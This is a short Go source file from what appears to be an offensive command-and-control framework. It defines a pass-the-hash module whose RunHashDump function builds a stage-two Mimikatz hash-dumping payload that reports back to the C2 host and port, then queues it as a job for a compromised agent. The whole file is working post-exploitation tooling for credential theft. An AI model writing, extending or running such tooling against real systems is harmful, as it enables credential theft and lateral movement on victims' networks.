package local_exploit

import (
	"divine-dragon/c2"
	"divine-dragon/payload_generator"
	"divine-dragon/util"
)

type PassTheHashModule struct {
	c2m       *c2.C2Module
	agentUuid string
	logger    util.Logger
}

func NewPassTheHashModule(c2mOpt *c2.C2Module, agentUuidOpt string) *PassTheHashModule {
	pthm := PassTheHashModule{
		c2m:       c2mOpt,
		agentUuid: agentUuidOpt,
	}
	pthm.logger = util.PassTheHashLogger(true, "")
	return &pthm
}

func (pthm *PassTheHashModule) RunHashDump() {
	stpgm := payload_generator.NewStageTwoPayloadGeneratorModule(pthm.c2m.GetC2Hostname(), pthm.c2m.GetC2Port(), "mimikatz_hashdump", "windows", "amd64", "mimikatz_hashdump.exe")
	stpgm.Run()

	err := pthm.c2m.AddJob(pthm.agentUuid, "mimikatz_hashdump.exe")
	if err != nil {
		pthm.logger.Log.Error(err)
	}
}
